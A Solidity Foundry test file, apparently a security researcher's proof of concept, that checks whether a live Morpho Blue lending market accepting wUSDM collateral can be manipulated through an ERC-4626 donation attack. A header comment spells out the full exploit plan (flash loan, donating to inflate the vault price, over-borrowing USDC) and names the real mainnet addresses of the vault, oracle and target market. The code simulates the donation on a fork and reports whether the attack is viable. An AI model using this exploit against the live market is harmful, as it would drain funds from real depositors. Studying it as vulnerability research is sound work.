// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// ERC-4626 Vault Donation Attack on Morpho Blue
//
// Attack vector (same as Venus zkSync wUSDM attack):
//   1. Flash loan USDC from Morpho Blue (market with no collateral)
//   2. Swap USDC → USDM (underlying asset of wUSDM vault)
//   3. Donate USDM directly to wUSDM contract → inflates convertToAssets()
//   4. Oracle 0x38Ed reads wUSDM.convertToAssets() with NO Chainlink/TWAP/CAPO
//      → price() inflated proportionally
//   5. Deposit small amount of wUSDM as collateral in target Morpho market
//   6. Borrow USDC at inflated collateral value → over-borrow
//   7. Repay flash loan, keep profit
//
// Key addresses (Ethereum Mainnet):
//   wUSDM vault:     0x57F5E098CaD7A3D1Eed53991D4d66C45C9AF7812
//   USDM (asset):    0x59D9356E565Ab3A36dD77763Fc0d87fEaf85508C
//   Morpho Blue:     0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb
//   Oracle:          0x38Ed40ab78D2D00467CedD5B1631C040768cdfCa
//   Target market:   0x6cd5fd13ae90d2e4ecc70032e64ca48b263d94763168a7e7e11ecbf9dbe56c19
//
// Oracle analysis:
//   BASE_VAULT  = wUSDM (0x57F5...)  ← convertToAssets() used directly
//   BASE_FEED_1 = 0x0000...          ← NO Chainlink feed
//   QUOTE_FEED_1= 0x0000...          ← NO Chainlink feed
//   SCALE_FACTOR= 1e6 (USDC decimals)
//   price() = convertToAssets(1e18) * 1e6
//
// ===========================================================================

import "../basetest.sol";

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IERC4626 is IERC20 {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function asset() external view returns (address);
}

interface IMorphoBlue {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
    function supplyCollateral(
        MarketParams memory marketParams,
        uint256 assets,
        address onBehalf,
        bytes calldata data
    ) external;
    function borrow(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        address receiver
    ) external returns (uint256, uint256);
    function supply(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        bytes calldata data
    ) external returns (uint256, uint256);
    function repay(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        bytes calldata data
    ) external returns (uint256, uint256);
    function withdrawCollateral(
        MarketParams memory marketParams,
        uint256 assets,
        address onBehalf,
        address receiver
    ) external;
    function market(bytes32 id) external view returns (
        uint128 totalSupplyAssets,
        uint128 totalSupplyShares,
        uint128 totalBorrowAssets,
        uint128 totalBorrowShares,
        uint128 lastUpdate
    );
}

struct MarketParams {
    address loanToken;
    address collateralToken;
    address oracle;
    address irm;
    uint256 lltv;
}

interface IMorphoOracle {
    function price() external view returns (uint256);
    function BASE_VAULT() external view returns (address);
    function SCALE_FACTOR() external view returns (uint256);
}

contract MorphoDonationAttack_wUSDM is BaseTestWithBalanceLog {
    // === Addresses ===
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC4626 constant wUSDM = IERC4626(0x57F5E098CaD7A3D1Eed53991D4d66C45C9AF7812);
    IERC20 constant USDM = IERC20(0x59D9356E565Ab3A36dD77763Fc0d87fEaf85508C);
    IMorphoBlue constant MORPHO = IMorphoBlue(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IMorphoOracle constant ORACLE = IMorphoOracle(0x38Ed40ab78D2D00467CedD5B1631C040768cdfCa);

    // Target market: wUSDM collateral / USDC loan
    bytes32 constant MARKET_ID = 0x6cd5fd13ae90d2e4ecc70032e64ca48b263d94763168a7e7e11ecbf9dbe56c19;
    MarketParams targetMarket = MarketParams({
        loanToken: address(USDC),
        collateralToken: address(wUSDM),
        oracle: address(ORACLE),
        irm: 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC,
        lltv: 965000000000000000
    });

    // Fork at current block (mainnet)
    uint256 constant FORK_BLOCK = 21_800_000; // adjust as needed

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        fundingToken = address(USDC);

        vm.label(address(USDC), "USDC");
        vm.label(address(wUSDM), "wUSDM");
        vm.label(address(USDM), "USDM");
        vm.label(address(MORPHO), "MorphoBlue");
        vm.label(address(ORACLE), "wUSDM_Oracle");
    }

    function testDonationAttackAnalysis() public {
        // === Phase 0: Observe pre-attack state ===
        uint256 priceBefore = ORACLE.price();
        uint256 convertBefore = wUSDM.convertToAssets(1e18);
        uint256 totalAssetsBefore = wUSDM.totalAssets();
        uint256 totalSupplyBefore = wUSDM.totalSupply();

        emit log_named_uint("Oracle price BEFORE", priceBefore);
        emit log_named_uint("convertToAssets(1e18) BEFORE", convertBefore);
        emit log_named_uint("wUSDM totalAssets BEFORE", totalAssetsBefore);
        emit log_named_uint("wUSDM totalSupply BEFORE", totalSupplyBefore);

        // === Phase 1: Simulate donation ===
        // Deal USDM to this contract (simulating attacker obtaining USDM)
        uint256 donationAmount = 1_000_000 * 1e18; // 1M USDM donation
        deal(address(USDM), address(this), donationAmount);

        // Donate directly to wUSDM vault
        USDM.transfer(address(wUSDM), donationAmount);

        // === Phase 2: Observe post-donation state ===
        uint256 priceAfter = ORACLE.price();
        uint256 convertAfter = wUSDM.convertToAssets(1e18);
        uint256 totalAssetsAfter = wUSDM.totalAssets();

        emit log_named_uint("Oracle price AFTER", priceAfter);
        emit log_named_uint("convertToAssets(1e18) AFTER", convertAfter);
        emit log_named_uint("wUSDM totalAssets AFTER", totalAssetsAfter);

        // === Phase 3: Calculate inflation ===
        uint256 priceInflation = (priceAfter * 10000) / priceBefore;
        emit log_named_uint("Price inflation (basis points, 10000=1x)", priceInflation);

        // Verify the oracle IS manipulable
        assertGt(priceAfter, priceBefore, "Oracle price should increase after donation");
        assertGt(convertAfter, convertBefore, "convertToAssets should increase after donation");

        // === Phase 4: Check market liquidity (can we actually profit?) ===
        (uint128 supplyAssets,,uint128 borrowAssets,,) = MORPHO.market(MARKET_ID);
        uint256 availableLiquidity = uint256(supplyAssets) - uint256(borrowAssets);
        emit log_named_uint("Market available USDC liquidity", availableLiquidity);
        emit log_named_uint("Market total supply USDC", uint256(supplyAssets));
        emit log_named_uint("Market total borrow USDC", uint256(borrowAssets));

        // === Conclusion ===
        if (availableLiquidity < 1e6) { // less than $1 USDC
            emit log_string("RESULT: Oracle IS manipulable but market has insufficient liquidity to profit");
            emit log_string("RISK: LATENT - attack becomes viable if market TVL grows");
        } else {
            emit log_string("RESULT: Oracle IS manipulable AND market has liquidity - ATTACK VIABLE");
        }
    }
}
